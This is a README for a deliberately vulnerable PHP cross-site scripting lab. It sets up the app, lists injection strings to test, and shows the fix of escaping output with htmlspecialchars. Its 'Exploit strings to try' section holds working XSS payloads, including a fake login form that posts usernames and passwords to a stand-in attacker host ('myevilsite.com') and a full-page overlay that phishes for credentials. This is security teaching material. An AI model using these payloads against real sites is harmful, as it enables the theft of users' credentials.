# Cross-site Scripting Example - PHP

## Building the example

* Clone this git repository
* Run <code>docker-compose build && docker-compose up</code> Note this may take a couple minutes the first time. It will be faster on subsequent executions since docker will cache the packages that the php container uses.
* Open a browser and navigate to your virtual server

## Exploit strings to try

* &lt;h1&gt;Hello&lt;/h1&gt;

* &lt;div id='stealPassword'&gt;Please Login:&lt;form name='input' action='http://myevilsite.com/stealPassword.php' method='post'&gt;Username: &lt;input type='text' name='username'&gt;&lt;br&gt;Password: &lt;input type='password' name='password'&gt;&lt;input type='submit' value='Login'&gt;&lt;/form&gt;&lt;/div&gt;

* &lt;/pre&gt;&lt;div id="overlay" style="position:fixed;top:0;left:0;bottom:0;right:0;height: 100%;width: 100%;margin: 0;padding: 0;background: %23000000;opacity: 1;filter: alpha(opacity=30);-moz-opacity: 1;z-index: 101;"&gt;&lt;h1&gt;Sorry, we got your credentials wrong. Can you enter them again?&lt;/h1&gt;&lt;form method="get" action=""&gt;&lt;input type="text" name="username"&gt;&lt;br&gt;&lt;input type="password" name="password"&gt;&lt;br&gt;&lt;input type="submit"&gt;&lt;/div&gt;

## Fixing the vulnerabilities

* Locate the spots in the code where the malicious strings are being <strong>printed</strong> and surround the string with <code>htmlspecialchars($YOUR_STRING_VARIABLE_HERE, ENT_QUOTES, 'UTF-8');</code>
